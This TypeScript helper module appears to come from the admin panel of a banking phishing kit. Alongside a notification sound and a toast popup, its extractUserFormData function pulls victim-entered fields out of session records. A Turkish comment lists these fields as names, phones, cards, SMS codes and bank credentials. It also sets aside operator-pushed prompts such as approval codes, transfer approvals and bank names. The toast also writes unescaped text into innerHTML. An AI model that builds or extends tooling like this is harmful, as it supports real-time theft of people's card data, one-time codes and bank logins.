export function playBeautifulNotification() {
  if (typeof window === "undefined") return;

  try {
    // Gerçekçi YouTube "Ding" / Resepsiyon Zili Sesi
    const audio = new Audio("/sounds/ding.mp3");
    audio.volume = 0.8;
    audio.play().catch(e => console.error("Audio play blocked by browser:", e));
  } catch (e) {
    console.error("Audio playback failed", e);
  }
}

export function showBeautifulToast(message: string, description?: string) {
  if (typeof window === "undefined") return;

  const containerId = "admin-toast-container";
  let container = document.getElementById(containerId);
  if (!container) {
    container = document.createElement("div");
    container.id = containerId;
    container.className = "fixed top-6 right-6 z-[9999] flex flex-col gap-3 pointer-events-none";
    document.body.appendChild(container);
  }

  const toast = document.createElement("div");
  toast.className = "transform transition-all duration-500 translate-x-12 opacity-0 flex items-start gap-4 p-4 rounded-xl shadow-2xl bg-[#2a2a2a] text-white border border-[#444] pointer-events-auto min-w-[300px]";
  
  toast.innerHTML = `
    <div class="flex-shrink-0 mt-0.5">
      <div class="w-8 h-8 rounded-full bg-[#EB5E28]/20 flex items-center justify-center">
        <svg class="w-5 h-5 text-[#EB5E28]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
        </svg>
      </div>
    </div>
    <div class="flex-1">
      <h4 class="text-sm font-bold">${message}</h4>
      ${description ? `<p class="text-xs text-gray-400 mt-1">${description}</p>` : ''}
    </div>
  `;

  container.appendChild(toast);

  // Trigger animation
  requestAnimationFrame(() => {
    toast.classList.remove("translate-x-12", "opacity-0");
    toast.classList.add("translate-x-0", "opacity-100");
  });

  // Remove after 4 seconds
  setTimeout(() => {
    toast.classList.remove("translate-x-0", "opacity-100");
    toast.classList.add("translate-x-12", "opacity-0");
    setTimeout(() => {
      if (container && toast.parentNode === container) {
        container.removeChild(toast);
      }
    }, 500);
  }, 4000);
}

/**
 * Sessions tablosundaki form_data nesnesinden sadece ve sadece
 * kullanicinin girdigi alanlari (isim, telefon, kart, SMS, banka credential vb.) suzer.
 * Admin tarafindan basilan teknik ayarlar, bildirim metinleri, sorular, generator kodlari
 * kesinlikle form verisi degisimi sayilmaz!
 */
export function extractUserFormData(data: any): Record<string, any> {
  if (!data || typeof data !== "object") return {};
  const ADMIN_KEYS = new Set([
    "generatorType",
    "generatorCode",
    "generatorLoginHistory",
    "transferApproval",
    "specialNoticeText",
    "specialNoticeImage",
    "specialNoticeLang",
    "specialNoticeSentAt",
    "customQuestionText",
    "customQuestionSentAt",
    "is_wheel_game",
    "is_win2_flow",
    "pending_profile",
    "currency",
    "bankSlug",
    "bankName",
    "partner_display_name",
    "participationCode",
    "amount",
  ]);

  const userFields: Record<string, any> = {};
  for (const [k, v] of Object.entries(data)) {
    if (ADMIN_KEYS.has(k)) continue;
    if (v === undefined || v === null || v === "") continue;

    // customQuestions: sadece kullanicinin verdigi cevap varsa dikkate al
    if (k === "customQuestions" && Array.isArray(v)) {
      const answers = v.map((item: any) => item?.answer).filter(Boolean);
      if (answers.length > 0) userFields.customQuestionsAnswers = answers;
      continue;
    }

    // generatorCurrent: sadece kullanicinin doldurdugu data nesnesi varsa dikkate al
    if (k === "generatorCurrent" && typeof v === "object") {
      const userDatas = Object.entries(v)
        .filter(([_, item]: any) => item?.data && Object.keys(item.data).length > 0)
        .map(([variant, item]: any) => ({ variant, data: item.data }));
      if (userDatas.length > 0) userFields.generatorCurrentDatas = userDatas;
      continue;
    }

    // admin prompt sifirlamalari (approvalStatus: "", approvalCode: "") atla
    if ((k === "approvalStatus" || k === "approvalCode") && !String(v).trim()) {
      continue;
    }

    userFields[k] = v;
  }
  return userFields;
}
